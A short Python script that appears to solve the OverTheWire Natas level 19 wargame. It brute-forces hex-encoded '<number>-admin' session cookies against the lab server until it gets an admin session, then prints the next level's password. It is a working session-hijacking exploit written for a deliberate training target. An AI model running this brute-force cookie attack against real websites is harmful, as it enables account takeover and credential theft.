import subprocess
import re
import requests
from requests.auth import HTTPBasicAuth

fail_string = "You are logged in as a regular user. Login as an admin to retrieve credentials for natas20."

def inject_payload(pid):
    #Username and Password for natas website/level
    passw = subprocess.run(['getpass', '19'], stdout=subprocess.PIPE).stdout.decode('utf-8')
    payload = {'PHPSESSID':pid}
    r = requests.post('http://natas19.natas.labs.overthewire.org/', auth=HTTPBasicAuth('natas19',passw.strip()), data={'username':'admin','password':'pass'}, cookies=payload)
    passreg = '[a-zA-Z0-9]{32}'
    if fail_string not in r.text:
        print(re.findall(passreg, r.text)[1])
        return True
    return False

if __name__ == "__main__":
    for i in range(0,640):
        payload = str(i) + '-admin'
        if inject_payload(payload.encode('utf-8').hex()):
            break

